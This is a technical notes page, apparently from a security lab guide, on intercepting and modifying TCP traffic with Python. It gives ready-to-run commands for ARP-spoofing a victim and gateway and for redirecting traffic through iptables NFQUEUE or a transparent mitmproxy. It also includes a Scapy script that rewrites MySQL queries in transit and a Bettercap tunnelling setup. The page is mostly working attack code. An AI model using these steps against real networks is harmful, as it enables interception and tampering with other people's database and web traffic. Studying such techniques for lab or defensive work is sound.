---
title: "Python (Scapy & mitmproxy)"
---

# 🐍 Python

Two Python-based approaches:

- **Scapy + NFQUEUE** : low-level, full control, but SEQ/ACK desync if size changes
- **mitmproxy** : stateful TCP proxy, handles size changes natively

## Resources

- [mitmproxy Transparent Proxying](https://docs.mitmproxy.org/stable/howto-transparent/)

## Scapy + NFQUEUE

Low-level packet interception using `iptables` NFQUEUE and Python.
**Scapy recalculates checksums automatically**, but SEQ/ACK desync remains
if you change the payload size.

### Architecture

```
Victim -> [arpspoof] -> Attacker -> [iptables NFQUEUE] -> Python (scapy) -> Gateway
```

### Prerequisites

```bash
# System
apt install -y build-essential python3-dev libnetfilter-queue-dev

# Python
pip install scapy cython
pip install git+https://github.com/oremanj/python-netfilterqueue
```

### Setup

```bash
# 1. IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. ARP spoof (two terminals)
arpspoof -i eth0 -t <VICTIM_IP> <GATEWAY_IP>
arpspoof -i eth0 -t <GATEWAY_IP> <VICTIM_IP>

# 3. Redirect to NFQUEUE
iptables -I FORWARD -p tcp --dport 3306 -j NFQUEUE --queue-num 0

# 4. Sniff
tcpdump -i eth0 -A -s 0 'tcp port 3306'
```

### Script (Core Logic)

```python
from scapy.all import IP, TCP, Raw
import netfilterqueue

MYSQL_PORT = 3306
ORIGINAL = b"SHOW TABLES LIKE 'user%'"
REPLACEMENT = b"SHOW TABLES LIKE '%'"

def modify(pkt):
    if not pkt.haslayer(Raw) or not pkt.haslayer(TCP):
        return None
    if pkt[TCP].dport != MYSQL_PORT:
        return None
    if ORIGINAL not in pkt[Raw].load:
        return None

    # Replace the SQL query (different length here)
    pkt[Raw].load = pkt[Raw].load.replace(ORIGINAL, REPLACEMENT)

    # Force checksum recalculation
    # Deleting these fields tells Scapy to recompute them
    del pkt[IP].len
    del pkt[IP].chksum
    del pkt[TCP].chksum
    return pkt

def process(packet):
    scapy_pkt = IP(packet.get_payload())
    modified = modify(scapy_pkt)
    if modified:
        packet.set_payload(bytes(modified))
    packet.accept()

q = netfilterqueue.NetfilterQueue()
q.bind(0, process)
q.run()
```

::: danger

**If length changes, TCP breaks.**

- Shorter: client receives modified payload, then sends RST
- Longer: server retransmits, socket stuck in CLOSING / FIN_WAIT2
- Checksums are valid, the packet is sent, but SEQ/ACK are now inconsistent
- Solution: patch the MySQL header (like in the Bettercap example) or use mitmproxy

:::

### Cleanup

```bash
iptables -D FORWARD -p tcp --dport 3306 -j NFQUEUE --queue-num 0
echo 0 > /proc/sys/net/ipv4/ip_forward
# Ctrl+C arpspoof processes
```

## mitmproxy (Stateful)

The **only reliable way** to change payload size on raw TCP.
mitmproxy terminates the TCP connection, modifies application data,
and opens a new connection to the real server.
The OS network stack handles all SEQ/ACK.

### Transparent Mode

```bash
# 1. Enable forwarding
sysctl -w net.ipv4.ip_forward=1
sysctl -w net.ipv4.conf.all.send_redirects=0

# 2. Redirect to mitmproxy
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# 3. Start mitmproxy
mitmproxy --mode transparent --showhost
```

Then write a Python addon to modify requests/responses.

### Integration with Bettercap

Bettercap can tunnel intercepted traffic to mitmproxy:

```bash
set tcp.address <REMOTE_IP>
set tcp.port <REMOTE_PORT>
set tcp.tunnel.address 127.0.0.1
set tcp.tunnel.port 8080
tcp.proxy on
```

### Custom TCP Proxy (Minimal)

For maximum control, write a simple TCP proxy in Python:

```python
import socket, threading

def handle(client, upstream_host, upstream_port):
    upstream = socket.create_connection((upstream_host, upstream_port))

    def forward(src, dst):
        while True:
            data = src.recv(4096)
            if not data: break
            dst.sendall(data)

    threading.Thread(target=forward, args=(client, upstream), daemon=True).start()
    threading.Thread(target=forward, args=(upstream, client), daemon=True).start()
```

The OS handles TCP sequencing. You only touch application data.
**Size changes are safe.**
